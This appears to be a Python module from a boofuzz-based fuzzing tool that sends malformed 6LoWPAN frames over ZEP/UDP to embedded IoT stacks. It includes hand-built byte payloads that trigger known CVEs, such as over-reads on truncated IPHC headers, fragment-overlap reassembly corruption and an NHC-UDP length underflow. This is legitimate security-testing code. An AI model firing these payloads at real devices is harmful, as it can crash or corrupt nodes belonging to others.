"""6LoWPAN Adaptation-Layer Fuzzer

Fuzzes the 6LoWPAN (RFC 4944 / RFC 6282) adaptation layer that sits between
IEEE 802.15.4 MAC frames and IPv6 on constrained IoT / mesh stacks. The bugs
this targets are IPHC-decompression over-reads and fragment-reassembly
corruption in embedded stacks:

    - RIOT-OS       ~13 6LoWPAN CVEs (IPHC / frag reassembly)
    - Contiki-NG    CVE-2022-36052/36053/36054, CVE-2021-21410,
                    CVE-2019-8359 (fragment overlap)
    - Zephyr        CVE-2021-3323 (UDP-NHC uncompression length underflow)
    - RIOT          CVE-2023-33975 (fragment reassembly buffer)
    - lwIP          6LoWPAN IPHC decompression

Encapsulation (so the payload is network-reachable AND offline-testable):

    UDP/17754  ->  ZEP v2 (Zigbee Encapsulation Protocol)
               ->  IEEE 802.15.4 MAC data frame (minimal, static)
               ->  6LoWPAN adaptation-layer bytes   <-- FUZZED

The ZEP + 802.15.4 MAC prefix is emitted as a valid, non-fuzzed Static block;
only the 6LoWPAN dispatch / payload bytes are mutated (except
SixLoWPAN_802154_LongAddr_Short, which deliberately fuzzes the 802.15.4
frame-control to claim addressing the frame is too short to carry).
"""

from typing import List

from boofuzz import Block, Group, Request, Static

from ..core.base_fuzzer import BaseFuzzer, RequestInfo
from ..core.connections import UDPSocketConnection
from ..primitives.dynamic import SmartBytes

# ZEP (Zigbee Encapsulation Protocol) UDP port used by Wireshark / sniffers.
ZEP_PORT = 17754


def _zep_header(mac_frame_len: int) -> bytes:
    """Build a valid ZEP v2 (Data) header wrapping a 802.15.4 frame.

    Wireshark ZEP v2 layout: preamble "EX", version 2, type 0 (data), channel,
    device id, CRC/LQI mode, LQI, 8-byte NTP timestamp, 4-byte sequence, 10
    reserved bytes, then a 1-byte length of the 802.15.4 frame that follows.
    """
    return (
        b"EX"  # preamble
        + b"\x02"  # version 2
        + b"\x01"  # ZEP v2 frame-type = Data (1; 0=Reserved, 2=Ack)
        + b"\x0b"  # channel 11
        + b"\x00\x01"  # device id
        + b"\x01"  # CRC/LQI mode
        + b"\xff"  # LQI value
        + b"\x00" * 8  # NTP timestamp
        + b"\x00\x00\x00\x01"  # sequence number
        + b"\x00" * 10  # reserved
        + bytes([mac_frame_len & 0xFF])  # length of 802.15.4 frame
    )


# Minimal valid IEEE 802.15.4 MAC *data* header:
#   FCF 0x8841 (wire LE 0x41 0x88): data frame, dst short addr, src short addr,
#   PAN-ID compression -> src PAN elided.
#   seq, dst PAN 0xABCD, dst 0xFFFF (bcast), src 0x0001.
MAC154_DATA_HEADER = (
    b"\x41\x88"  # frame control (data, short/short, PAN compression)
    b"\x01"  # sequence number
    b"\xcd\xab"  # dst PAN 0xABCD
    b"\xff\xff"  # dst addr (broadcast)
    b"\x00\x01"  # src addr
)

# Static, non-fuzzed prefix for the 6LoWPAN requests: ZEP header + MAC header.
STATIC_ZEP_154_PREFIX = _zep_header(len(MAC154_DATA_HEADER) + 24) + MAC154_DATA_HEADER

# ZEP header only (no MAC): used by the 802.15.4-addressing malformed request,
# which supplies its own deliberately-short MAC frame.
STATIC_ZEP_HEADER = _zep_header(0x20)


class SixLoWPANFuzzer(BaseFuzzer):
    """6LoWPAN adaptation-layer fuzzer (ZEP-encapsulated over UDP/17754).

    STRICT 1:1 convention: every RequestInfo name equals its boofuzz Request
    node's first-arg name, and each is individually gated by
    ``is_request_enabled(<name>)`` so --enable / --disable select exactly one.
    """

    # Liveness only: 6LoWPAN targets are embedded stacks reached over a mesh /
    # sniffer bridge; a ping monitor detects a crashed node.
    DEFAULT_MONITORS = "ping"

    PROTOCOL_OPTIONS: dict = {}

    @classmethod
    def get_request_definitions(cls) -> List[RequestInfo]:
        """Static request definitions for --list-requests."""
        return [
            RequestInfo(
                "SixLoWPAN_Baseline",
                "Valid IPHC-compressed IPv6 frame (dispatch 0x60-0x7F)",
                "baseline",
            ),
            RequestInfo(
                "SixLoWPAN_IPHC_Truncated",
                "IPHC claims inline addr/NH fields but frame cut after dispatch (over-read)",
                "malformed",
            ),
            RequestInfo(
                "SixLoWPAN_NHC_UDP_Underflow",
                "NHC-UDP compressed port/length nibble drives integer underflow (CVE-2021-3323)",
                "overflow",
            ),
            RequestInfo(
                "SixLoWPAN_FRAG1_DispatchOnly",
                "FRAG1 dispatch (0xC0/0xC1) with the 4-byte frag header truncated",
                "malformed",
            ),
            RequestInfo(
                "SixLoWPAN_FRAGN_DispatchOnly",
                "FRAGN dispatch (0xE0) dispatch-only, offset byte absent",
                "malformed",
            ),
            RequestInfo(
                "SixLoWPAN_Frag_Overlap",
                "FRAG1+FRAGN with overlapping/oversized size+offset (CVE-2023-33975/CVE-2019-8359)",
                "boundary",
            ),
            RequestInfo(
                "SixLoWPAN_HighBit_ShiftUB",
                "Decompressed field byte >=0x80 shifted <<24 (signed-shift UB)",
                "boundary",
            ),
            RequestInfo(
                "SixLoWPAN_802154_LongAddr_Short",
                "802.15.4 FCF claims 64-bit src+dst on a frame too short to hold them",
                "malformed",
            ),
        ]

    def _create_socket(self):
        # ZEP is UDP; bind an ephemeral local port so any node response is read.
        return UDPSocketConnection(
            self.config.target_ip,
            self.config.target_port,
            bind=("0.0.0.0", 0),
            **self._timeout_overrides(recv_default=2.0),
        )

    def setup_custom_monitors(self) -> list:
        # No protocol-specific monitor; DEFAULT_MONITORS="ping" handles liveness.
        return []

    def _define_protocol(self) -> None:
        """Define the 8 6LoWPAN request groups (STRICT 1:1, each gated)."""

        # 1. Baseline: a plausible, valid IPHC-compressed IPv6 frame.
        #    Dispatch 0b011xxxxx (0x60-0x7F). SAM/DAM=11 -> addresses elided;
        #    NH/HLIM inline kept short and consistent.
        baseline = Request(
            "SixLoWPAN_Baseline",
            children=(
                Block(
                    "SixLoWPAN_Baseline_Frame",
                    children=(
                        Static("prefix", STATIC_ZEP_154_PREFIX),
                        Group(
                            "iphc_dispatch",
                            values=[b"\x7a", b"\x60", b"\x78", b"\x7f"],  # LOWPAN_IPHC
                        ),
                        Static("iphc_byte2", b"\x33"),  # CID0 SAC0 SAM11 DAM11
                        Static("inline", b"\x3a\x40"),  # NH=ICMPv6(0x3a), HLIM=64
                        SmartBytes(
                            "payload", b"\x80\x00\x00\x00", max_len=64, fuzzable=True
                        ),  # ICMPv6 echo stub (variable tail -> Radamsa mutation)
                    ),
                ),
            ),
        )

        # 2. IPHC truncated: byte1=0x60 (TF/NH/HLIM all inline), byte2=0x00
        #    (SAM=00,DAM=00 -> full 128-bit src+dst inline). Decompressor then
        #    memcpy's 16+16 address bytes + TF/NH/HLIM out of a 2-byte input.
        iphc_truncated = Request(
            "SixLoWPAN_IPHC_Truncated",
            children=(
                Block(
                    "SixLoWPAN_IPHC_Truncated_Frame",
                    children=(
                        Static("prefix", STATIC_ZEP_154_PREFIX),
                        Group(
                            "iphc_claim",
                            values=[
                                b"\x60\x00",  # TF/NH/HLIM inline, 128-bit src+dst inline
                                b"\x60\x10",  # SAC=1 stateful, DAM=00 128-bit dst inline
                                b"\x78\x00",  # HLIM inline via 0b011 11000
                                b"\x7e\x00",  # NH/HLIM elided but 128-bit addrs claimed
                            ],
                        ),
                        # nothing follows -> over-read past the 2 dispatch bytes
                    ),
                ),
            ),
        )

        # 3. NHC-UDP underflow: IPHC with NH=1 (0x7B) then LOWPAN_NHC_UDP
        #    dispatch 0b11110CPP (0xF0-0xF7). A single compressed port nibble
        #    with no length/port bytes makes the uncompressed-length math
        #    wrap (Zephyr CVE-2021-3323).
        nhc_udp_underflow = Request(
            "SixLoWPAN_NHC_UDP_Underflow",
            children=(
                Block(
                    "SixLoWPAN_NHC_UDP_Underflow_Frame",
                    children=(
                        Static("prefix", STATIC_ZEP_154_PREFIX),
                        Static("iphc", b"\x7b\x33"),  # IPHC NH compressed (0x7B)
                        Group(
                            "nhc_udp",
                            values=[
                                b"\xf3",  # C=0, both ports 4-bit -> truncated, no ports
                                b"\xf0",  # both ports inline claimed, none present
                                b"\xf7\x00",  # ports elided flag + lone byte
                                b"\xf4\xf0",  # checksum-elided + dangling port nibble
                            ],
                        ),
                    ),
                ),
            ),
        )

        # 4. FRAG1 dispatch only: FRAG1 = 0b11000xxx (0xC0-0xC7). The 4-byte
        #    frag header (11-bit datagram_size + 16-bit tag) is truncated to the
        #    single dispatch byte -> over-read on size/tag.
        frag1_dispatch_only = Request(
            "SixLoWPAN_FRAG1_DispatchOnly",
            children=(
                Block(
                    "SixLoWPAN_FRAG1_DispatchOnly_Frame",
                    children=(
                        Static("prefix", STATIC_ZEP_154_PREFIX),
                        Group(
                            "frag1_dispatch",
                            values=[b"\xc0", b"\xc1", b"\xc5", b"\xc7"],  # FRAG1
                        ),
                    ),
                ),
            ),
        )

        # 5. FRAGN dispatch only: FRAGN = 0b11100xxx (0xE0-0xE7). Header is
        #    datagram_size + tag + offset (5 bytes); we send only the dispatch,
        #    so the offset byte is absent -> over-read.
        fragn_dispatch_only = Request(
            "SixLoWPAN_FRAGN_DispatchOnly",
            children=(
                Block(
                    "SixLoWPAN_FRAGN_DispatchOnly_Frame",
                    children=(
                        Static("prefix", STATIC_ZEP_154_PREFIX),
                        Group(
                            "fragn_dispatch",
                            values=[b"\xe0", b"\xe1", b"\xe5", b"\xe7"],  # FRAGN
                        ),
                    ),
                ),
            ),
        )

        # 6. Fragment overlap / oversize: a full FRAG1 (dispatch+size+tag) plus a
        #    FRAGN whose offset*8 + fragment exceeds/overlaps datagram_size ->
        #    reassembly-buffer/allocator corruption (RIOT CVE-2023-33975,
        #    Contiki CVE-2019-8359). Each Group value is FRAG1||FRAGN bytes:
        #      C0 08  = datagram_size 8 (0x008), tag AABB;
        #      then FRAGN E0 08 AABB <offset>  with offset*8 >> size.
        frag_overlap = Request(
            "SixLoWPAN_Frag_Overlap",
            children=(
                Block(
                    "SixLoWPAN_Frag_Overlap_Frame",
                    children=(
                        Static("prefix", STATIC_ZEP_154_PREFIX),
                        Group(
                            "overlap_frag",
                            values=[
                                # size=8, then FRAGN offset=0xFF (0xFF*8=2040 >> 8)
                                b"\xc0\x08\xaa\xbb\xe0\x08\xaa\xbb\xffAAAAAAAA",
                                # size=1, offset points past a 1-byte datagram
                                b"\xc0\x01\xaa\xbb\xe0\x01\xaa\xbb\x20BBBBBBBB",
                                # datagram_size=0x7FF (max 11-bit), tiny frags overlap at 0
                                b"\xc7\xff\xaa\xbb\xe0\x08\xaa\xbb\x00CCCCCCCC",
                                # two FRAGN at same offset -> overlapping copies
                                b"\xc0\x10\xaa\xbb\xe0\x10\xaa\xbb\x01\xe0\x10\xaa\xbb\x01",
                            ],
                        ),
                    ),
                ),
            ),
        )

        # 7. High-bit shift UB: decompressed hop-limit / length byte >= 0x80 that
        #    a stack sign-extends via `<<24`. IPHC byte1 0x60 keeps HLIM inline;
        #    the following byte is the poisoned hop-limit value.
        highbit_shift_ub = Request(
            "SixLoWPAN_HighBit_ShiftUB",
            children=(
                Block(
                    "SixLoWPAN_HighBit_ShiftUB_Frame",
                    children=(
                        Static("prefix", STATIC_ZEP_154_PREFIX),
                        Static("iphc", b"\x60\x33"),  # TF/NH/HLIM inline, addrs elided
                        Static("tf_nh", b"\x00\x00\x00\x00\x3a"),  # 4-byte TF + NH
                        Group(
                            "high_hlim",
                            values=[b"\x80", b"\xff", b"\xc0", b"\x81"],  # bit7 set
                        ),
                    ),
                ),
            ),
        )

        # 8. 802.15.4 long-address / short-frame: fuzz the MAC frame-control to
        #    claim 64-bit src+dst addressing (FCF 0xCC41 -> wire 0x41 0xCC) on a
        #    frame far too short to carry two 8-byte addresses. Uses the ZEP
        #    header only (no static MAC) so the MAC bytes are the mutation.
        longaddr_short = Request(
            "SixLoWPAN_802154_LongAddr_Short",
            children=(
                Block(
                    "SixLoWPAN_802154_LongAddr_Short_Frame",
                    children=(
                        Static("zep", STATIC_ZEP_HEADER),
                        Group(
                            "mac_shortframe",
                            values=[
                                # FCF ext dst + ext src, seq, partial dst PAN, then EOF
                                b"\x41\xcc\x01\xcd\xab",
                                # ext addressing claimed, only 3 bytes of one addr
                                b"\x41\xcc\x02\xcd\xab\x11\x22\x33",
                                # src ext (0xC0 hi), dst short: mixed, still too short
                                b"\x41\xc8\x03\xcd\xab\xff\xff",
                                # both ext, no addressing bytes at all
                                b"\x41\xcc",
                            ],
                        ),
                    ),
                ),
            ),
        )

        # ---- STRICT 1:1 gated wiring: one connect() per RequestInfo name ----
        if self.is_request_enabled("SixLoWPAN_Baseline"):
            self.session.connect(baseline)
        if self.is_request_enabled("SixLoWPAN_IPHC_Truncated"):
            self.session.connect(iphc_truncated)
        if self.is_request_enabled("SixLoWPAN_NHC_UDP_Underflow"):
            self.session.connect(nhc_udp_underflow)
        if self.is_request_enabled("SixLoWPAN_FRAG1_DispatchOnly"):
            self.session.connect(frag1_dispatch_only)
        if self.is_request_enabled("SixLoWPAN_FRAGN_DispatchOnly"):
            self.session.connect(fragn_dispatch_only)
        if self.is_request_enabled("SixLoWPAN_Frag_Overlap"):
            self.session.connect(frag_overlap)
        if self.is_request_enabled("SixLoWPAN_HighBit_ShiftUB"):
            self.session.connect(highbit_shift_ub)
        if self.is_request_enabled("SixLoWPAN_802154_LongAddr_Short"):
            self.session.connect(longaddr_short)

        return self.session
